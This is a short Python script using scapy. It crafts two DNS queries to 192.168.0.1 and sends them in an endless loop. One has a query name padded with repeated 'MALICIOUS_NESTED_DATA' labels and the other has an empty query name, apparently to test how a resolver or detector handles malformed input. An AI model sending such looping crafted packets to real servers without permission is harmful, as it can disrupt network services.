from scapy.all import *
from scapy.layers.dns import DNSQR


def send_packets():
    target_ip = "192.168.0.1"
    target_port = "domain"
    ip = IP(dst=target_ip)
    udp = UDP(sport=RandShort(), dport=target_port)
    dns_1 = DNS(
        rd=1,
        qd=DNSQR(
            qname="MALICIOUS_NESTED_DATA.MALICIOUS_NESTED_DATA.MALICIOUS_NESTED_DATA.MALICIOUS_NESTED_DATA."
                  "MALICIOUS_NESTED_DATA.MALICIOUS_NESTED_DATA.MALICIOUS_NESTED_DATA.MALICIOUS_NESTED_DATA."
                  "MALICIOUS_NESTED_DATA.MALICIOUS_NESTED_DATA.www.google.com"
        )
    )
    p_1 = ip / udp / dns_1

    target_ip = "192.168.0.1"
    target_port = "domain"
    ip = IP(dst=target_ip)
    udp = UDP(sport=RandShort(), dport=target_port)
    dns_2 = DNS(
        rd=1,
        qd=DNSQR(
            qname=""
        )
    )
    p_2 = ip / udp / dns_2

    send([p_1, p_2], iface="en0", loop=1, verbose=0, inter=1)


if __name__ == "__main__":
    send_packets()
